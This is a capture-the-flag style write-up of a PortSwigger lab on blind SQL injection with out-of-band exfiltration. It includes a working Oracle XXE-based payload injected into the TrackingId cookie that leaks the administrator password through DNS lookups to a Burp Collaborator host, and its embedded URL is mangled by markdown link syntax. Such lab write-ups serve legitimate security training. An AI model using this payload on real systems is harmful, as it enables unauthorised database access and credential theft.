# 🎯 Platform: PortSwigger
### 📝 Target: Lab - Blind SQL injection with out-of-band data exfiltration

> **Vulnerability Location:** `TrackingId` cookie
> **Goal:** Exploit the blind SQL injection to exfiltrate the `administrator` password via an out-of-band (OAST) interaction, then log in.

---

## 🔍 Analysis & Attack Flow
### The Mechanism (Data Exfiltration via OAST)
*   **Context:** The application is fully blind and asynchronous. We cannot see responses, and time delays might not be reliable or supported.
*   **The Technique:** Instead of just triggering a DNS lookup (like the previous lab), we can actually **steal data** by making the database append the sensitive data to the external domain name.
*   **How it works:** When the database attempts to resolve the URL to make a network request, it executes our subquery first. If we concatenate the result of `(SELECT password FROM users WHERE username='administrator')` with our Burp Collaborator domain, the database will do a DNS lookup for `<password>.your-collaborator-id.oastify.com`. We can then read the password directly from our Collaborator logs.

---

## 🚀 Exploitation Steps

### Step 1: Generate a Collaborator Payload
*   Open the Burp Collaborator client and copy a unique payload domain (e.g., `a5g2j3fuv96lp53sapq1rs8bp2vwjq7f.oastify.com`).

### Step 2: Construct the Exfiltration Payload
*   **Reference:** Using the PortSwigger SQL injection cheat sheet for "DNS lookup with data exfiltration" (Oracle).
*   **Payload Logic:** We use the `||` operator to concatenate the HTTP protocol, our malicious subquery, and the Collaborator domain.
*   **Working Query:**
    ```sql
    ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'[.a5g2j3fuv96lp53sapq1rs8bp2vwjq7f.oastify.com/](https://.a5g2j3fuv96lp53sapq1rs8bp2vwjq7f.oastify.com/)"> %remote;]>'),'/l') FROM dual) --
    ```

### Step 3: Execute the Attack
*   Capture a request in Burp Suite Repeater.
*   URL-encode the working query and inject it into the `TrackingId` cookie value.
*   Send the request. The application will return a standard `HTTP/2 200 OK` response instantly.

### Step 4: Retrieve the Exfiltrated Data
*   Go back to the Burp Collaborator client and click **Poll now**.
*   Look for `DNS` and `HTTP` interactions.
*   Select an interaction and check the **Request to Collaborator** tab.
*   You will see the target database attempted to resolve or connect to a subdomain that looks like this:
    > `a8brecm34nrd6q0jlgks.a5g2j3fuv96lp53sapq1rs8bp2vwjq7f.oastify.com`
*   The prefix of the domain (`a8brecm34nrd6q0jlgks`) is the exfiltrated administrator password!

### Step 5: Authenticate
*   Navigate to the `/my-account` page.
*   Log in using the username `administrator` and the extracted password (`a8brecm34nrd6q0jlgks`).
*   🎉 **Lab is marked as solved!**
